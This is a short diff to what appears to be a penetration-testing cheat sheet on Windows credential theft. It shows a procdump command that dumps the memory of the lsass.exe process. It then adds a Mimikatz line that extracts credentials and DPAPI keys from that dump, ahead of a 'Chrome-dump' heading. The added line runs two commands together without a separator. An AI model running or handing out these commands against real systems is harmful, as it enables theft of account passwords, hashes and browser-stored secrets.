@@ -7,6 +7,8 @@
 
 ````
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
+sekurlsa::minidump lsass.dmpsekurlsa::dpapi
+
 ````
 ## Mimikatz Chrome-dump
 
